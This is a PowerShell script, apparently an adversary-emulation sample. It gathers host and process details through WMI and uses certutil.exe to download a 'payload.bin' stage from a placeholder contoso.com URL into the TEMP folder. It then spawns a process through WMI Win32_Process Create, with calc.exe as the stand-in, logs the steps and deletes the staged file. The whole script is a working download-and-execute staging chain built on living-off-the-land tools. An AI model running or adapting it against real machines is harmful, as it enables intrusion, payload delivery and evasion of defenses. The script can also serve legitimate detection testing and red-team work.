
[CmdletBinding()]
param(
    [string]$EndpointUrl = "http://contoso.com:80/downloads/payload.bin",
    [string]$PayloadPath = "$env:TEMP\stage2.bin",
    [string]$StageLog = "$env:TEMP\recon.log"
)
$ErrorActionPreference = "Continue"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Get-WmiInventory {
    $System = Get-CimInstance -ClassName Win32_ComputerSystem
    $Processes = Get-CimInstance -ClassName Win32_Process | Select-Object -First 15 ProcessId,Name,CommandLine
    return [PSCustomObject]@{
        ComputerName = $System.Name
        Domain = $System.Domain
        Processes = $Processes
    }
}

function Invoke-LolbinStage {
    [CmdletBinding()]
    param(
        [string]$DownloadUrl = '',
        [string]$DestinationPath = ''
    )

    Write-Verbose ("Downloading stage with certutil")
    certutil.exe -urlcache -split -f $DownloadUrl $DestinationPath
    if (Test-Path -Path $DestinationPath -ErrorAction SilentlyContinue) {
        Write-Verbose "Staged payload present"
    }
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-StageLog -Message "Starting WMI/LOLBin stage"
    $StageResult = Get-WmiInventory
    Write-StageLog -Message ("Host: " + $StageResult.ComputerName)
    $StageDownloaded = Invoke-LolbinStage -DownloadUrl $EndpointUrl -DestinationPath $PayloadPath
    if ($StageDownloaded) {
        $ProcessResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
        Write-StageLog -Message ("Process ID: " + $ProcessResult.ProcessId)
    }
}
catch {
    Write-Warning "WMI/LOLBin workflow failed: $($_.Exception.Message)"
}

$WmiReport = [ordered]@{
    Stage = "wmi-lolbin"
    Endpoint = $EndpointUrl
    PayloadPath = $PayloadPath
}
$WmiReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Retry budget remaining"
Write-Verbose "Applying operation timeout"
Write-Verbose "Resolving configured target"
Write-Verbose "Collecting host metadata"
Write-Verbose "Operation completed"
Write-Verbose "Checking local path"
Write-Verbose "Validating result"
Write-Verbose "Inspecting process list"
Write-Verbose "Stage handoff finished"
Write-Verbose "Exporting operation report"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
